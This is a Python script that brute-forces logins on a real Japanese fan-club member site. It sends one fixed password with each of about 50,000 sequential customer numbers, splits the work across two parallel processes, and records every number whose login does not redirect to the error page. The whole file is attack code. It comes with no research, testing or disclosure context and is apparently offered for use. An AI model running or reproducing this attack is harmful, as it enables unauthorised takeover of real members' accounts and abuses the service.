from bs4 import BeautifulSoup
import requests
import json
from multiprocessing import Process
import os

# Configure
USERNAME_LB = '01800000'
USERNAME_UB = '01850000'
USERNAME_LEN = 8
PASSWORD = '9789'
RESULT_PATH = 'result.txt'

URL = 'https://www.fc-member.johnnys-net.jp/login.php'
HEADERS = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,en-US;q=0.4',
    'Cache-Control':'max-age=0',
    'Connection':'keep-alive',
    'Content-Type':'application/x-www-form-urlencoded',
    'DNT':'1',
    'Host':'www.fc-member.johnnys-net.jp',
    'Origin':'https://www.fc-member.johnnys-net.jp',
    'Referer':'https://www.fc-member.johnnys-net.jp/login_jfc.html?A',
    'Upgrade-Insecure-Requests':'1',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36'
}
PAYLOAD = {
    'fun_div_1':'A',
    'customer_no':'',
    'pass':PASSWORD,
    'flg':'',
    'mode':'login'
}

WRONGURL = 'https://www.fc-member.johnnys-net.jp/error_member.html'

def test_between(lb, ub):
    for uname in range(lb, ub + 1):
        username = str(uname).zfill(USERNAME_LEN)
        PAYLOAD['customer_no'] = username
        r = requests.post(URL, headers = HEADERS, data = PAYLOAD)
        if (r.url != WRONGURL):
            print('POSSIBLE: %s at URL %s\n' % (username, r.url))
            with open(RESULT_PATH, 'a+') as f:
                f.write('POSSIBLE: %s at URL %s\n' % (username, r.url))
        else:
            print('FAIL: %s at URL %s\n' % (username, r.url))
            with open(RESULT_PATH, 'a+') as f:
                f.write('FAIL: %s at URL %s\n' % (username, r.url))

ulb = int(USERNAME_LB)
uub = int(USERNAME_UB)
divp = (ulb + uub) / 2
p1 = Process(target=test_between, args=(ulb, divp))
p2 = Process(target=test_between, args=(divp + 1, uub))
p1.start()
p2.start()
p1.join()
p2.join()
print('Finished')
